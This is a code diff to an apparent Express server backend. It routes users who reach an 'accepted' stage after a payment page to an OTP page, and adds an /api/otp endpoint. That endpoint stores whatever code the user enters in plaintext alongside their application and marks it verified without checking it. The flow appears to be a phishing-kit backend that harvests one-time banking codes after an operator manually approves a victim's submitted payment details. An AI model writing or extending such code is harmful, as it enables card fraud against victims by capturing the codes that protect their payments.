@@ -182,13 +182,34 @@ app.get('/api/status/:id', (req, res) => {
   const payload = {
     ok: true,
     status: item.status || 'pending',
-    redirectUrl: item.status === 'accept' ? 'success-ar.html' : 'payment.html',
-    redirect: item.status === 'accept' ? 'success-ar.html' : null,
+    redirectUrl: item.status === 'accept' ? 'otp.html' : 'payment.html',
+    redirect: item.status === 'accept' ? 'otp.html' : null,
     decision: item.status === 'accept' ? 'approved' : item.status === 'reject' ? 'rejected' : null,
-    stage: item.status === 'accept' ? 'success' : 'payment'
+    stage: item.status === 'accept' ? 'otp' : 'payment'
   };
 
   res.json(payload);
+});
+
+app.post('/api/otp', (req, res) => {
+  const { id, otp } = req.body || {};
+  const list = readApplications();
+  const item = list.find((entry) => entry.id === id);
+
+  if (!item) {
+    return res.status(404).json({ ok: false, error: 'not_found' });
+  }
+
+  if (typeof otp !== 'string' || otp.trim().length < 4) {
+    return res.status(400).json({ ok: false, error: 'invalid_otp' });
+  }
+
+  item.status = 'otp_verified';
+  item.otp = otp;
+  item.updatedAt = new Date().toISOString();
+  writeApplications(list);
+
+  res.json({ ok: true, redirect: 'success-ar.html' });
 });
 
 app.post('/api/applications/:id/decision', (req, res) => {
